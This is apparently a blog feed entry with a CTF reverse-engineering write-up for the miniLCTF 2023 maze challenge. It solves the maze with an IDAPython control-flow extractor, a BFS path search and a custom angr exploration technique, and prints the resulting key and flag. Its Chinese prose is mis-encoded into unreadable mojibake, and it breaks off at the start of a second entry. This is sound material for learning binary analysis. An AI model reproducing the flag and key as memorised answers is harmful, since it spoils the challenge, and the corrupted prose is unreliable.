    <content type="html"><![CDATA[<p>ä¸€é“é¢˜å­¦ä¼šangrå’ŒIDApython,ç”šè‡³BFSï¼ˆï¼š</p><span id="more"></span><p>é¢˜ç›®æµç¨‹å¾ˆç®€å•ï¼Œè¾“å…¥ä¸€ä¸ª8ä¸ªåå…­è¿›åˆ¶æ•°ï¼Œä¾æ¬¡æ ¹æ®æœ€ä½ä½é€‰æ‹©ä¸€æ¡è·¯å¾„èµ°ï¼Œèµ°åˆ°ä¼šç»ˆç‚¹å³å¯å¾—åˆ°flag</p><p>è¿™é‡Œæ˜¯<a href="https://github.com/XDSEC/miniLCTF_2023/tree/main/Challenges/maze_aot">é¢˜ç›®</a></p><h2 id="IDApython"><a href="#IDApython" class="headerlink" title="IDApython"></a>IDApython</h2><p>è§‚å¯Ÿè¿·å®«çš„æµç¨‹å›¾ï¼Œä¼šå‘ç°æ˜¯å¾ˆæœ‰è§„å¾‹çš„ï¼Œæ¯ä¸€ä¸ªblockéƒ½æœ‰ä¸¤ä¸ªsuccessorï¼Œæ ¹æ®è¾“å…¥å†³å®šå‰å¾€å“ªä¸€ä¸ªsuccessorã€‚è¿˜è¦æ³¨æ„ä¸€ç‚¹ï¼Œå°±æ˜¯ä¼šæœ‰ç›´æ¥jmpå—ï¼Œéœ€è¦åšä¸ªå°å¤„ç†ã€‚é€šè¿‡IDApython æå–å¤„è¿·å®«çš„ç»“æ„ï¼Œå†ç”¨BFSç®—æ³•å»èµ°å³å¯ã€‚</p><h3 id="æå–è¿·å®«"><a href="#æå–è¿·å®«" class="headerlink" title="æå–è¿·å®«"></a>æå–è¿·å®«</h3><p>å¤§è‡´åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯è®¡ç®—æ¯ä¸ªblockçš„successorï¼Œå­˜å‚¨ä¸ºå­—å…¸å½¢å¼ï¼Œè¿™é‡Œä¸åŒºåˆ†æ˜¯æ™®é€šè·³è½¬è¿˜æ˜¯ç›´æ¥jmpè·³è½¬</p><p>ç¬¬äºŒéƒ¨åˆ†æ˜¯è®°å½•ç›´æ¥è·³è½¬å—</p><p>ç¬¬ä¸‰éƒ¨åˆ†æ˜¯è®¡ç®—æ™®é€šè·³è½¬æ˜¯é€šè¿‡ä»€ä¹ˆæ–¹å¼å»è·³ï¼Œå³æ˜¯jzè¿˜æ˜¯jnzï¼Œä¹Ÿæ˜¯å­˜å‚¨ä¸ºå­—å…¸å½¢å¼</p><p>noteï¼šåœ¨æå–è¿·å®«çš„æ—¶å€™ï¼Œæœ€å¥½å°†åœ°å€å…¨éƒ¨è½¬ä¸ºåè¿›åˆ¶çš„æ•´å‹ï¼Œå¦åˆ™åé¢æ¯”è¾ƒä¼šæœ‰å„ç§é—®é¢˜ï¼ˆåœ¨è¿™å¡äº†å¥½ä¹…ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python">start_ea = <span class="hljs-number">0x1500</span><br>end_ea = <span class="hljs-number">0x23D9</span><br><br>func = idaapi.get_func(start_ea)<br>cfg = idaapi.FlowChart(func)<br><br>Maze = <span class="hljs-built_in">dict</span>()<br>JmpMethod = <span class="hljs-built_in">dict</span>()<br>DirJmp = <span class="hljs-built_in">list</span>()<br><span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> cfg:<br>    BlockStart = block.start_ea<br>    BlockEnd = block.end_ea<br>    <br>    <span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸‹</span><br>    Maze[BlockStart] = <span class="hljs-built_in">list</span>()<br><br>    <span class="hljs-comment"># è®°å½•æ¯ä¸€ä¸ªå—å¯ä»¥å»å“ª</span><br>    <span class="hljs-keyword">for</span> succ <span class="hljs-keyword">in</span> block.succs():<br>        <span class="hljs-comment"># å¦‚æœä¸æ˜¯ç›´æ¥è·³è½¬å—ï¼Œé‚£ä¹ˆç›´æ¥è·å–successorçš„èµ·å§‹åœ°å€</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> GetDisasm(succ.start_ea).startswith(<span class="hljs-string">&#x27;jmp&#x27;</span>):<br>            Maze[BlockStart].append(succ.start_ea)<br>        <span class="hljs-comment"># å¦‚æœæ˜¯ç›´æ¥è·³è½¬å— é‚£ä¹ˆå°±è·å–è¯¥æ±‡ç¼–è¯­å¥jmpçš„åœ°å€ï¼Œå¹¶å°†å­—ç¬¦å‹åœ°å€è½¬ä¸ºæ•´æ•°å‹å­˜å‚¨</span><br>        <span class="hljs-keyword">else</span>:<br>            Maze[BlockStart].append(<span class="hljs-built_in">int</span>(GetDisasm(succ.start_ea)[-<span class="hljs-number">4</span>::],base=<span class="hljs-number">16</span>))<br>    <br>    <span class="hljs-comment"># è®°å½•ç›´æ¥è·³è½¬å—</span><br>    <span class="hljs-keyword">if</span> GetDisasm(BlockStart).startswith(<span class="hljs-string">&#x27;jmp&#x27;</span>):<br>        DirJmp.append(BlockStart)<br>        <br>    <span class="hljs-comment"># è®°å½•æ™®é€šè·³è½¬å—</span><br>    <span class="hljs-keyword">elif</span> BlockStart!=start_ea <span class="hljs-keyword">and</span> BlockStart!=end_ea:<span class="hljs-comment">#è¿™ä¸¤ä¸ªä¸ç­‰å·æ˜¯ç”¨æ¥æå¤´å»å°¾ï¼Œå¦åˆ™ä¸‹é¢Dstè½¬åŒ–å°±ä¼šæœ‰é—®é¢˜</span><br>        JmpMethod[BlockStart] = <span class="hljs-built_in">list</span>()<br>        <span class="hljs-comment">#  è¿™é‡Œæœ‰ä¸€ä¸ªç»†èŠ‚ å°±æ˜¯ä¸€ä¸ªblockçš„ç»“æŸåœ°å€ å¹¶ä¸æ˜¯è¿™ä¸ªblockæœ€åä¸€æ¡è¯­å¥çš„åœ°å€ è€Œæ˜¯å®ƒsuccessorçš„èµ·å§‹åœ°å€</span><br>        <span class="hljs-comment">#  æ‰€ä»¥è¿™é‡Œå°±è·å–ç»“æŸåœ°å€çš„å‰ä¸€æ¡è¯­å¥ æ¥å¾—åˆ°blockçš„æœ€åä¸€æ¡è¯­å¥</span><br>        <span class="hljs-comment">#  prev_headåŠŸèƒ½æ˜¯è·å–å‰ä¸€æ¡è¯­å¥ print_insn_mnemæ˜¯è·å–æ“ä½œæŒ‡ä»¤</span><br>        Dst = <span class="hljs-built_in">int</span>(GetDisasm(prev_head(BlockEnd))[-<span class="hljs-number">4</span>::],base=<span class="hljs-number">16</span>)<br>        JmpMethod[BlockStart].append(print_insn_mnem(prev_head(BlockEnd)))<br>        JmpMethod[BlockStart].append(Dst)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Maze:&quot;</span>)<br><span class="hljs-built_in">print</span>(Maze)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;***************************************************************&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;DirJmp:&quot;</span>)<br><span class="hljs-built_in">print</span>(DirJmp)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;***************************************************************&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;JmpMethod:&quot;</span>)<br><span class="hljs-built_in">print</span>(JmpMethod)<br>    <br></code></pre></td></tr></table></figure><h3 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h3><p>å¾—åˆ°è¿·å®«åï¼Œå°±å¯ä»¥ç”¨BFSèµ°ï¼ŒDFSåº”è¯¥æ˜¯èµ°ä¸å‡ºæ¥çš„ï¼Œå› ä¸ºå¯èƒ½æœ‰ç¯çš„å­˜åœ¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># æ¥ä¸Šæ–‡ä¸€èµ·</span><br><span class="hljs-keyword">import</span> queue<br><br>start = <span class="hljs-number">0x1500</span><br>end = <span class="hljs-number">0x23d9</span><br>q = queue.Queue()<br>q.put(<span class="hljs-number">0x1500</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">maze_walk</span>():<br>    visited = <span class="hljs-built_in">set</span>()<br>    father = &#123;<span class="hljs-number">0x1500</span>: <span class="hljs-literal">None</span>&#125; <span class="hljs-comment">#ç”¨äºå›æº¯</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> q.empty():<br>        curr = q.get() <span class="hljs-comment"># å–çš„åŒæ—¶ä¹Ÿä¼šå¼¹å‡º</span><br>        nxs = Maze[curr]<br>        <span class="hljs-keyword">for</span> dirc <span class="hljs-keyword">in</span> nxs:<br>            <span class="hljs-keyword">if</span> dirc <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>                visited.add(dirc)<br>                father[dirc] = curr<br>                q.put(dirc)<br><br>            <span class="hljs-keyword">if</span> dirc == end:<br>                p = [dirc]<br>                <span class="hljs-keyword">while</span> father[dirc] <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    dirc = father[dirc]<br>                    p.append(dirc)<br><br>                <span class="hljs-keyword">return</span> p[::-<span class="hljs-number">1</span>] <span class="hljs-comment"># åè½¬å¾—åˆ°ç”±èµ·ç‚¹-&gt;ç»ˆç‚¹è·¯å¾„</span><br><br><br>path = maze_walk()<br>p = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> path:<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> DirJmp: <span class="hljs-comment">#å¦‚æœæ˜¯jmpè·³ é‚£ä¹ˆä¸ç†ä»– ä¸‹ä¸€ä¸ª</span><br>        p.append(i)<br>p = p[<span class="hljs-number">1</span>:] <span class="hljs-comment">#é™¤å»ç¬¬ä¸€ä¸ªç‚¹å³0x1500</span><br><br><br>ans = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(p) - <span class="hljs-number">1</span>): <span class="hljs-comment"># ç»ˆç‚¹ä¸ç®—</span><br>    <span class="hljs-keyword">if</span> JmpMethod[p[i]][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;jnz&#x27;</span> <span class="hljs-keyword">and</span> JmpMethod[p[i]][<span class="hljs-number">1</span>] == p[i + <span class="hljs-number">1</span>]:<br>        ans += <span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> JmpMethod[p[i]][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;jz&#x27;</span> <span class="hljs-keyword">and</span> JmpMethod[p[i]][<span class="hljs-number">1</span>] == p[i + <span class="hljs-number">1</span>]:<br>        ans += <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">if</span> JmpMethod[p[i]][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;jnz&#x27;</span> <span class="hljs-keyword">and</span> JmpMethod[p[i]][<span class="hljs-number">1</span>] != p[i + <span class="hljs-number">1</span>]:<br>        ans += <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">if</span> JmpMethod[p[i]][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;jz&#x27;</span> <span class="hljs-keyword">and</span> JmpMethod[p[i]][<span class="hljs-number">1</span>] != p[i + <span class="hljs-number">1</span>]:<br>        ans += <span class="hljs-string">&#x27;1&#x27;</span><br><br><span class="hljs-comment"># å†åè½¬å¾—åˆ° å› ä¸ºè¿·å®«ä»è¾“å…¥çš„æœ€ä½ä½å¼€å§‹èµ°çš„ï¼Œæ‰€ä»¥æœ€å³è¾¹æ‰æ˜¯èµ·å§‹</span><br>ans = <span class="hljs-built_in">int</span>(ans[::-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ans))<br><span class="hljs-comment">#  893bddd9aa12789e</span><br></code></pre></td></tr></table></figure><h2 id="Angr"><a href="#Angr" class="headerlink" title="Angr"></a>Angr</h2><p>ä¸»è¦æ€è·¯å°±æ˜¯æ¨¡æ‹Ÿè¿·å®«çš„èµ°æ³•ï¼Œè‡ªå®šä¹‰ä¸€ä¸ªExplorationTechnique,é¿å…è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜ï¼Œæ¯•ç«Ÿ 2^64æ¬¡æ–¹è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œé‡Œé¢çš„å„ç§æŠ€æœ¯ç»†èŠ‚å¯ä»¥å‚è€ƒä¸‹ä¹‹å‰çš„æ–‡ç« ï¼ˆå°±æ˜¯å› ä¸ºè¿™é¢˜ï¼Œæ‰å†™äº†è¿™äº›æ–‡ç«  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> angr <span class="hljs-keyword">import</span> SimState<br><span class="hljs-comment"># ç»§æ‰¿ExplorationTechniqueç±»ï¼Œå¹¶é‡è½½ä¸€äº›æ–¹æ³•</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Walk</span>(angr.ExplorationTechnique):<br>    <span class="hljs-string">&quot;&quot;&quot;å¤§ä½“æ€è·¯å°±æ˜¯BFS&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,MazeRange:<span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">int</span> ,<span class="hljs-built_in">int</span>],MazeFinal:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        MazeRange:æ•´ä¸ªè¿·å®«èŒƒå›´ï¼Œä¹Ÿå°±æ˜¯èµ·å§‹åœ°å€åˆ°ç»“æŸåœ°å€ï¼Œæ³¨æ„æ˜¯æ•´ä¸ªè¿·å®«ï¼Œä¸æ˜¯èµ·å§‹åˆ°ç»ˆç‚¹çš„èŒƒå›´</span><br><span class="hljs-string">        MazeFinal:è¿·å®«ç»ˆç‚¹</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        self._MazeRange = MazeRange<br>        self._MazeFinal = MazeFinal<br>        self._Vistited = <span class="hljs-built_in">set</span>() <span class="hljs-comment">#ç”¨äºåˆ¤æ–­æ˜¯å¦è®¿é—®è¿‡</span><br>       <br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">self,simgr:angr.SimulationManager</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å®šä¹‰å¹¶åˆå§‹åŒ–ä¸¤ä¸ªstash</span><br><span class="hljs-string">        åˆå§‹åŒ–_Vistited</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        simgr.stashes[<span class="hljs-string">&#x27;visited&#x27;</span>] =[]<br>        simgr.stashes[<span class="hljs-string">&#x27;found&#x27;</span>] =[]<br>        self._Vistited.add(simgr.active[<span class="hljs-number">0</span>].addr)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">isInMaze</span>(<span class="hljs-params">self,state:angr.SimState</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>        <span class="hljs-keyword">return</span> self._MazeRange[<span class="hljs-number">0</span>] &lt;= state.addr &lt; self._MazeRange[<span class="hljs-number">1</span>]<br>    <br>  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">StateSplitter</span>(<span class="hljs-params">self,states:<span class="hljs-built_in">list</span>[angr.SimState]</span>) -&gt; <span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">list</span>[angr.SimState],<span class="hljs-built_in">list</span>[angr.SimState]]:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        æ­¤å‡½æ•°ç”¨äºåˆ†æ‹£Stateï¼Œå¦‚æœè®¿é—®è¿‡å°±ä¸è¦è®©è¿™ä¸ªStateåŠ å…¥ä¸‹ä¸€æ¬¡çš„å¾ªç¯äº†</span><br><span class="hljs-string">        ç±»ä¼¼äºBFSé‚£ä¸ªæ ¸å¿ƒè¦ç‚¹</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>            _keep =[]<br>            _split =[]<br>            <span class="hljs-keyword">for</span> state <span class="hljs-keyword">in</span> states:<br>                <span class="hljs-keyword">if</span> self.isInMaze(state): <span class="hljs-comment">#åˆ¤æ–­æ˜¯å¦åœ¨è¿·å®«èŒƒå›´å†…æ˜¯å› ä¸ºèµ°è¿·å®«çš„æ—¶å€™ä¼šcall &#x27;step&#x27; å‡½æ•°ï¼Œé‚£ä¸ªæˆ‘ä»¬ä¸å¤„ç†</span><br>                    <span class="hljs-keyword">if</span> state.addr <span class="hljs-keyword">in</span> self._Vistited:<br>                        _split.append(state)<br>                    <span class="hljs-keyword">else</span>:<br>                        self._Vistited.add(state.addr)<br>                        _keep.append(state)<br>                <span class="hljs-keyword">else</span>:<br>                    _keep.append(state) <span class="hljs-comment"># &#x27;step&#x27;æˆ–è€…å…¶ä»–éè¿·å®«å†…éƒ¨çš„stateæˆ‘ä»¬éƒ½è¦æ‰§è¡Œ</span><br><br>            <span class="hljs-keyword">return</span> _keep,_split<span class="hljs-comment"># è¿™é‡Œçš„è¿”å›é¡ºåºä¸èƒ½æ”¹ï¼Œå‰é¢çš„æ˜¯ä¿ç•™çš„ï¼Œåé¢çš„æ˜¯èˆå¼ƒçš„</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">isEnd</span>(<span class="hljs-params">self,state:SimState</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>            <span class="hljs-keyword">return</span> state.addr == self._MazeFinal <span class="hljs-comment"># åˆ¤æ–­æ˜¯å¦åˆ°ç»ˆç‚¹äº†</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">step</span>(<span class="hljs-params">self,simgr:angr.SimulationManager,stash :<span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;active&#x27;</span>,**kwargs</span>) -&gt; angr.SimulationManager:<br>        <span class="hljs-comment"># æ¨¡æ‹Ÿæ‰§è¡Œ</span><br>        simgr.step(stash=stash,**kwargs)<br><br>        <span class="hljs-comment"># ç­›é€‰ç”¨äºä¸‹ä¸€æ¬¡æ‰§è¡Œçš„state</span><br>        simgr.split(stash_splitter = self.StateSplitter,from_stash = <span class="hljs-string">&#x27;active&#x27;</span>,to_stash = <span class="hljs-string">&#x27;visited&#x27;</span>)<br><br>        <span class="hljs-comment"># å°†åˆ°ç»ˆç‚¹çš„stateå­˜ä¸‹æ¥</span><br>        simgr.move(from_stash = <span class="hljs-string">&#x27;active&#x27;</span>,to_stash = <span class="hljs-string">&#x27;found&#x27;</span>,filter_func = self.isEnd)<br><br>        <span class="hljs-keyword">return</span> simgr<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">complete</span>(<span class="hljs-params">self,simgr:angr.SimulationManager</span>):<br>        <span class="hljs-comment"># å®šä¹‰æ‰¾åˆ°ç»ˆç‚¹å°±ç»“æŸ</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(simgr.found)<br>    <br><br><span class="hljs-comment"># è£…è½½ è®¾å®šåŸºå€ä¸º0</span><br>proj = angr.Project(<span class="hljs-string">&quot;./maze&quot;</span>,auto_load_libs = <span class="hljs-literal">False</span>,main_opts=&#123;<span class="hljs-string">&#x27;base_addr&#x27;</span>: <span class="hljs-number">0</span>&#125;)<br><br><span class="hljs-comment"># æ‰¾åˆ°è¿™å‡ ä¸ªå¯¹è±¡</span><br>SymMazeWalk = proj.loader.find_symbol(<span class="hljs-string">&quot;maze_walk&quot;</span>)<br>SymMazeFinal = proj.loader.find_symbol(<span class="hljs-string">&quot;maze_final&quot;</span>)<br><br>SymKey = proj.loader.find_symbol(<span class="hljs-string">&quot;key&quot;</span>)<br>SymSteps = proj.loader.find_symbol(<span class="hljs-string">&quot;steps&quot;</span>)<br><br>KeyValue = claripy.BVS(<span class="hljs-string">&quot;SymKey&quot;</span>,<span class="hljs-number">64</span>)<br><br><span class="hljs-comment"># ä» maze_walk å¼€å§‹</span><br>State = proj.factory.call_state(SymMazeWalk.rebased_addr,prototype = <span class="hljs-string">&#x27;void f()&#x27;</span>)<br>State.options.add(angr.sim_options.ZERO_FILL_UNCONSTRAINED_REGISTERS)<br><br><span class="hljs-comment"># å› ä¸ºæˆ‘ä»¬è·³è¿‡äº†mainå‡½æ•°ï¼Œæ²¡æœ‰æ‰§è¡Œè¾“å…¥ æ‰€ä»¥è¦è‡ªå·±æŠŠè¾“å…¥ç»™å­˜è¿›å†…å­˜</span><br>State.memory.store(SymKey.rebased_addr,KeyValue)<br>State.memory.store(SymSteps.rebased_addr,KeyValue)<br><br><span class="hljs-comment"># å®ä¾‹åŒ–æˆ‘ä»¬çš„Walk</span><br>tech = Walk(MazeRange=(SymMazeWalk.rebased_addr,SymMazeWalk.rebased_addr + SymMazeWalk.size),<br>            MazeFinal=SymMazeFinal.rebased_addr)<br><br><span class="hljs-comment"># å‡†å¤‡æ‰§è¡Œ</span><br>Simgr = proj.factory.simgr(State)<br><span class="hljs-comment"># ä½¿ç”¨æˆ‘ä»¬çš„æœç´¢æ–¹å¼</span><br>Simgr.use_technique(tech)<br><br><span class="hljs-comment"># å¼€å§‹è·‘ ç›´åˆ°æ‰¾åˆ°å¯ä»¥è¾¾ç»ˆç‚¹çš„state</span><br>Simgr.run()<br><span class="hljs-comment"># ç§»é™¤æˆ‘ä»¬çš„æœç´¢æ–¹å¼ å‡†å¤‡ç»§ç»­æ‰§è¡Œ</span><br>Simgr.remove_technique(tech)<br><br><span class="hljs-comment"># ä»æˆ‘ä»¬æ‰¾åˆ°é‚£ä¸ªstateå¼€å§‹æ‰§è¡Œ</span><br>SolveState = proj.factory.simgr(Simgr.found[<span class="hljs-number">0</span>])<br>SolveState.run()<br><span class="hljs-comment"># æ‰§è¡Œåˆ°æœ€åå¾—åˆ°è¾“å‡º å³ä¸ºflag</span><br><span class="hljs-built_in">print</span>(SolveState.deadended[<span class="hljs-number">0</span>].posix.dumps(<span class="hljs-number">1</span>))<br><br><span class="hljs-comment"># miniLctf&#123;YOU_AR3_$0_GOOD_4T_SOLV1NG_MAZE&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>recurrence</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
      <tag>idapython</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ExplorationTechnique</title>
    <link href="/2023/05/24/ExplorationTechniques/"/>
    <url>/2023/05/24/ExplorationTechniques/</url>
    
    <content type="html"><![CDATA[<p>About <a href="https://docs.angr.io/en/latest/_modules/angr/exploration_techniques.html#ExplorationTechnique">ExplorationTechnique</a></p><span id="more"></span><p>é¦–å…ˆï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªç±»ã€‚å…ˆæ¥çœ‹çœ‹angrå¯¹è¿™ä¸ªç±»çš„è¯´æ˜</p><blockquote><p><em>An technique is a set of hooks for a simulation manager that assists in the implementation of new techniques in symbolic exploration.</em>      </p><p><em>Any number of these methods may be overridden by a subclass.</em> <em>To use an exploration technique, call <code>simgr.use_technique</code> with an *instance* of the technique.</em></p></blockquote><p>å°±æ˜¯è¯´è¿™ä¸ªtechniqueæ˜¯ä¸€ç³»åˆ—hookçš„é›†åˆï¼Œå¯ä»¥æ›´å¥½å¸®åŠ©æˆ‘ä»¬ç¬¦å·æ‰§è¡Œã€‚è€Œä¸”è¿™ä¸ªç±»é‡Œé¢çš„æ–¹æ³•éƒ½å¯ä»¥ä½¿ç”¨å­ç±»é‡å†™ï¼Œç”¨ä¸€ä¸ªå®ä¾‹æ¥è°ƒç”¨<code>simgr.use_technique</code> </p><p>å…¶å®è¿™ä¸ªç±»å°±æ˜¯å¸®æˆ‘ä»¬æŠŠç¬¦å·æ‰§è¡Œæ‰€å¿…é¡»çš„å‡ ä¸ªæ­¥éª¤ç»™æˆ‘ä»¬æ‰“åŒ…èµ·æ¥ï¼Œç„¶åè®©æˆ‘ä»¬é‡è½½é‡Œé¢çš„æ­¥éª¤ï¼Œæ–°ç”Ÿæˆä¸€ä¸ªå­ç±»ï¼Œç„¶åæŒ‰ç…§è¿™å­ç±»é‡Œé¢è§„å®šçš„æ–¹æ³•å»ç¬¦å·æ‰§è¡Œ</p><p>è¿™æ˜¯æ•´ä¸ªç±»çš„å®šä¹‰ä»¥åŠç›¸å…³æˆå‘˜å‡½æ•°çš„è¯´æ˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 